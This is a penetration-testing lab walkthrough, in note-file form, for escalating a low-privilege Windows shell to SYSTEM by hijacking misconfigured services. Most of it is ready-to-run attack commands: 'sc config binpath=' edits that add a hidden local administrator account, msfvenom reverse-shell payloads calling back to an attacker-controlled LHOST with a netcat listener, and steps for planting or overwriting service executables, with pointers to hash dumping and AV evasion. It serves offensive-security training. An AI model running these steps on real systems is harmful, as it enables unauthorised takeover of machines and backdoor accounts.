# 🪟 Scenario 16 — Windows Service Hijacking → SYSTEM (lab walkthrough)

> **Given:** you already have a **low-priv Windows shell** (a local user, `iis apppool`, or a weak service account) and `whoami /priv` gave **no `SeImpersonate`**. A misconfigured Windows **service runs as `LocalSystem`**, so if you control *what it executes*, you execute as **SYSTEM**. This is the full lab drill — enumerate → pick the hijack route → exploit → prove SYSTEM. Fill `<placeholders>` from your own run, invent nothing.

Part of [[_MOC (Standalone Scenarios)]]. Reference card: [[Windows Service Exploits]]. Escalate hub: [[Windows Privilege Escalation]]. Related: [[Windows PrivEsc Enumeration]] · [[Shells]] · [[File Transfer Cheat Sheet]] · [[Token Privileges & Potato]].

```cmd
set LHOST=<KALI_IP>
set LPORT=443
```

---

## 🧠 WHY SERVICE HIJACKING WORKS
A Windows service has a **binary path** (`ImagePath` / `binPath`) that the Service Control Manager (SCM) launches, normally under **`NT AUTHORITY\SYSTEM`**. You win if you can change *what SCM runs* in any of **four** ways:

| Hijack | What you control | Precondition |
|---|---|---|
| **Weak service ACL** | reconfigure `binPath` directly | you have `SERVICE_CHANGE_CONFIG` / `SERVICE_ALL_ACCESS` on the service |
| **Unquoted service path** | plant an exe Windows runs *instead* | path has a space, is unquoted, and an earlier dir is writable |
| **Writable service binary** | overwrite the `.exe` on disk | you can write the file the service launches |
| **Writable service dir (DLL)** | drop a DLL the binary loads | service exe loads a missing/writable DLL from a writable folder → see [[DLL Search Order & PATH Hijacking]] |

> Common thread: **restart the service** (or wait for reboot) to trigger. All four are what **PowerUp** and **winPEAS** scream about.

---

## 1️⃣ ENUMERATE — find the weak service
Transfer `accesschk.exe`, `PowerUp.ps1`, `winPEASx64.exe` first ([[File Transfer Cheat Sheet]]).

**Fastest: let PowerUp do all four checks:**
```powershell
powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"
```
Read its output — the useful functions on their own:
```powershell
. .\PowerUp.ps1
Get-ModifiableService          # services whose config YOU can change (weak ACL)
Get-ModifiableServiceFile      # services whose .exe/dir YOU can write
Get-UnquotedService            # unquoted paths with a writable gap
```

**Manual — unquoted service paths (classic):**
```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```
Any row with a **space and no quotes** (e.g. `C:\Program Files\Vuln Service\service.exe`) is a candidate.

**Manual — weak service ACLs (needs `accesschk.exe`):**
```cmd
accesschk.exe -accepteula -uwcqv "Authenticated Users" *
accesschk.exe -accepteula -uwcqv "%USERNAME%" *
accesschk.exe -accepteula -uwcqv "Everyone" *
```
Look for **`SERVICE_CHANGE_CONFIG`** or **`SERVICE_ALL_ACCESS`** on a service you don't own.

**Manual — writable binary / directory:**
```cmd
sc qc <SERVICE>                               :: shows BINARY_PATH_NAME + SERVICE_START_NAME
accesschk.exe -accepteula -quvw "C:\path\to\service.exe"
accesschk.exe -accepteula -quvw "C:\path\to\"
icacls "C:\path\to\service.exe"               :: look for (F)/(M)/(W) for your user/BUILTIN\Users
```

**Confirm the account + start type before you touch it:**
```cmd
sc qc <SERVICE>        :: SERVICE_START_NAME should be LocalSystem; note START_TYPE
sc query <SERVICE>     :: RUNNING / STOPPED
```
> If `SERVICE_START_NAME` is **not** `LocalSystem`/`LocalService`-but-privileged, the hijack only gets you *that* account — still may be useful, but confirm it's worth it.

---

## 🌿 BRANCH — pick the route the enum gave you

### Route A — Weak service ACL → reconfigure `binPath` (cleanest)
You can change the config, so just point it at your command. **A service "binary" that isn't a real service will fail to report to SCM — but your command still runs** before the failure, so an add-user payload is the reliable OSCP move:

```cmd
:: 1) repoint the service at your command (mind the SPACE after binpath=)
sc config <SERVICE> binpath= "cmd /c net user pwn Pass123! /add && net localgroup administrators pwn /add"

:: 2) trigger it
sc stop <SERVICE>
sc start <SERVICE>

:: 3) you now have a local admin — use it
net localgroup administrators
```
Prefer a reverse shell? Point `binPath` at a service-aware exe (see §Payloads) or at `nc.exe`:
```cmd
sc config <SERVICE> binpath= "C:\Windows\Temp\rev.exe"
sc stop <SERVICE> & sc start <SERVICE>
```
PowerUp one-liner equivalent:
```powershell
. .\PowerUp.ps1
Invoke-ServiceAbuse -Name '<SERVICE>' -Command "net user pwn Pass123! /add && net localgroup administrators pwn /add"
```
> **Be polite / restore:** note the original `BINARY_PATH_NAME` from `sc qc` first so you can `sc config <SERVICE> binpath= "<ORIGINAL>"` afterwards (exam cleanup — [[Post-Engagement Cleanup]]).

### Route B — Unquoted service path → plant an exe
Service path is e.g. `C:\Program Files\Vuln Service\service.exe`. Windows tries each space-split prefix **with `.exe` appended**, left to right:
```
C:\Program.exe
C:\Program Files\Vuln.exe
C:\Program Files\Vuln Service\service.exe   (the real one, last)
```
Drop your exe at the **first writable** candidate so SCM runs it first:
```cmd
:: confirm which gap is writable:
accesschk.exe -accepteula -quvw "C:\Program Files\"
accesschk.exe -accepteula -quvw "C:\Program Files\Vuln Service\"

:: place the payload named for that gap:
copy C:\Windows\Temp\rev.exe "C:\Program Files\Vuln.exe"
sc stop <SERVICE> & sc start <SERVICE>
```
(If `C:\` itself is writable, `C:\Program.exe` wins — rare on modern boxes.)

### Route C — Writable service binary → overwrite it
You can write the actual `.exe` the service launches:
```cmd
:: back up the original first
copy "C:\path\to\service.exe" C:\Windows\Temp\service.exe.bak

copy /y C:\Windows\Temp\rev.exe "C:\path\to\service.exe"
sc stop <SERVICE> & sc start <SERVICE>
```

### Route D — Writable service directory → DLL hijack
The service exe loads a DLL it can't find (or one you can overwrite) from its own writable folder. Build a malicious DLL and drop it there → restart. Full detail in [[DLL Search Order & PATH Hijacking]].

---

## 🧪 PAYLOADS (build on Kali)
**Add-admin (no catcher needed, best with `sc config binpath=`):** use the inline `cmd /c net user ...` above.

**Reverse shell exe:**
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o rev.exe
```
**Service-aware exe** (keeps SCM happy so the service actually "starts" when you *replace a real service binary* — Routes B/C):
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe-service -o rev.exe
```
Catch it:
```bash
sudo nc -lvnp $LPORT       # or: sudo rlwrap nc -lvnp 443
```
> Match **architecture** (`sc qc` path / `systeminfo`) — x64 payload for a 64-bit service. For add-user payloads the SCM timeout (~30 s) doesn't matter; for shells, `exe-service` avoids the service hanging and being killed.

---

## 2️⃣ TRIGGER WHEN YOU CAN'T RESTART
No rights to `sc stop/start`? Check how the service starts:
```cmd
sc qc <SERVICE>        :: START_TYPE = AUTO_START → fires on reboot
```
- `AUTO_START` → force/await a **reboot**: `shutdown /r /t 0` (only if you can), or just wait — many lab boxes reboot on a timer.
- Some services **auto-restart** on crash (`sc qc` recovery) — crash it.
- A dependent service restart can pull yours along: `sc qc <SERVICE>` → `DEPENDENCIES`.

---

## 3️⃣ PROVE SYSTEM
Reverse-shell route — in the caught shell:
```cmd
whoami            :: nt authority\system
whoami /groups
hostname
type C:\Users\Administrator\Desktop\proof.txt
```
Add-admin route — use the new account:
```cmd
runas /user:pwn cmd            :: or RDP/WinRM/psexec with pwn:Pass123!
```
Then dump creds for reuse → [[Dumping Windows Hashes]].

---

## 🗺️ DECISION FLOW
```
low-priv shell, no SeImpersonate
   └─ PowerUp Invoke-AllChecks / winPEAS
        ├─ weak service ACL  ─► sc config binpath= (add-admin / rev) ─► restart ─► SYSTEM ✅
        ├─ unquoted path     ─► plant C:\...\Gap.exe in writable prefix ─► restart ─► SYSTEM ✅
        ├─ writable .exe     ─► overwrite service.exe (exe-service) ─► restart ─► SYSTEM ✅
        └─ writable dir+DLL  ─► drop malicious DLL ─► restart ─► SYSTEM ✅   ([[DLL Search Order & PATH Hijacking]])
   (can't restart? START_TYPE=AUTO → reboot / crash-restart / dependency)
```

## 🚧 STUCK?
1. **No service bug at all** → this isn't the path. Go back to the hub order: stored creds, AlwaysInstallElevated, tasks/autoruns, registry, patches → [[Windows Privilege Escalation]].
2. **`accesschk` / PowerUp blocked by AV** → run `sc qc`, `sc sdshow <svc>`, `icacls`, `wmic service` manually; try [[Windows AV Evasion]] packing.
3. **Can reconfigure but can't stop/start** → §2 (reboot/auto-restart/dependency); check `sc sdshow` for your `RP`/`WP` rights.
4. **Shell dies instantly** → service killed your non-service exe; rebuild with `-f exe-service`, or switch to the **add-admin** payload which doesn't need a surviving process.
5. **Wrong arch / silent fail** → rebuild payload for the service's bitness; confirm the exe runs manually first.
6. **Service account isn't SYSTEM** → `sc qc` `SERVICE_START_NAME`; the hijack yields only that account — may still enable further reuse.

## 🧠 ONE-LINE LESSON
**A SYSTEM service you can reconfigure (`sc config binpath=`), whose unquoted path has a writable gap, or whose exe/dir you can write, is a direct SYSTEM win — enumerate with PowerUp/accesschk, drop an add-admin or `exe-service` payload, restart the service, done.**
